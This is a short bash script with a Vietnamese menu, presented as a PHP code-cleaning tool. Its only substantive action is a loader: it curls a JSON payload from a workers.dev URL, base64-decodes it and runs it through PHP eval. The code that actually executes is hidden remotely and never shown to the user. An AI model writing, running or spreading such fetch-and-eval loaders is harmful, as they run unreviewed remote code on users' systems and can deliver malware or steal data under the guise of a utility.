#!/usr/bin/env bash

clear
echo -e "===== [TOOLS PHP CODE CLEAN BY AN ORIN] =====\n"

echo "[1] Clean V1.0"
echo "[2] Lọc File"

read -p "Chọn: " choose

case $choose in
    1) mode=15 ;;
    2) mode=16 ;;
    *) echo "Sai lựa chọn"; exit ;;
esac

URL="https://old-rain-6157.anorintool.workers.dev/?mode=$mode"

echo "[+] Đang tải và thực thi..."

curl -s "$URL" \
| php -r '
$data = json_decode(stream_get_contents(STDIN), true);

if (!$data || !isset($data["status"])) {
    exit("❌ JSON lỗi\n");
}

if ($data["status"] !== "success") {
    exit("⚠️ API lỗi\n");
}

if (empty($data["data"])) {
    exit("⚠️ Không có dữ liệu\n");
}

$real = base64_decode($data["data"]);

if ($real === false || trim($real) === "") {
    exit("⚠️ Decode rỗng\n");
}

eval("?>".$real);
'